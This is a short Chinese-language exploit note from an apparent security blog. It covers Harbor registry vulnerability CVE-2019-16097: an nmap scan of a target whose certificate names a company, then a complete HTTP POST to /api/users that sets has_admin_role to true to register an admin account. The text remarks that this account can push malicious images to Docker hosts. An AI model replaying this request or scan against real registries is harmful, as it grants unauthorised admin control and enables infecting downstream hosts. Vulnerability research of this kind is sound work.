---
title: Harbor
category:
- [Kali, Exploit]
- 
tags:
  - null
date: 2020-12-04 20:22:36
top:
updated:
---

Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，可以用来构建企业内部的Docker镜像仓库


## 信息收集
```zsh
 sudo nmap -sV -Pn -T4 -sSU -p 80,443 -sC    192.168.79.207         
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:39 CST
Nmap scan report for 192.168.79.207
Host is up (0.0065s latency).

PORT    STATE         SERVICE  VERSION
80/tcp  filtered      http
443/tcp open          ssl/http nginx 1.11.5
|_http-server-header: nginx/1.11.5
|_http-title: Harbor
| ssl-cert: Subject: commonName=*.mama.cn/organizationName=GZSC/stateOrProvinceName=Guangdong/countryName=CN
| Not valid before: 2016-07-08T03:03:28
|_Not valid after:  2017-07-08T03:03:28
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
80/udp  open|filtered http
443/udp open|filtered https

Nmap done: 1 IP address (1 host up) scanned in 132.41 seconds

```



## Harbor任意管理员注册漏洞 CVE-2019-16097

影响版本：  
Harbor 1.7.0-1.8.2，当且仅当镜像仓库开启了用户注册功能

### BurpSuite测试

漏洞存在接口为 /api/users 的 POST 方法，  
当提交的用户参数中包含 `has_admin_role: true` 时，则可直接注册创建权限为管理员的账号，  
并且可上传写入恶意 Docker 镜像，进而可直接感染使用此镜像仓库的 Docker 主机。

```
POST /api/users HTTP/1.1
Host: 127.0.0.1
Content-Length: 131
Accept: application/json
Origin: http://127.0.0.1
User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14
Content-Type: application/json
Referer: http://127.0.0.1/harbor/sign-in
Accept-Language: zh-CN,zh;q=0.9
Cookie: sid=5bb9aad90164bd2ed5274edaf20f9c81
Connection: close
{"username":"mrhonest","email":"mrhonest@qq.com","realname":"mrhonest","password":"111111Aaa","comment":"11111","has_admin_role":true}
```

#### 注册时抓包

![harbor-1](../images/harbor-1.jpg)

#### 添加poc

1.  `"has_admin_role":true`

![harbor-2](../images/harbor-2.jpg)

#### 管理员权限

![c4a7a60f8c8244c5bb38031347a66743](../images/harbor-3.jpg)

### Python脚本

[harbor添加管理员漏洞检测工具](https://github.com/theLSA/harbor-give-me-admin.git)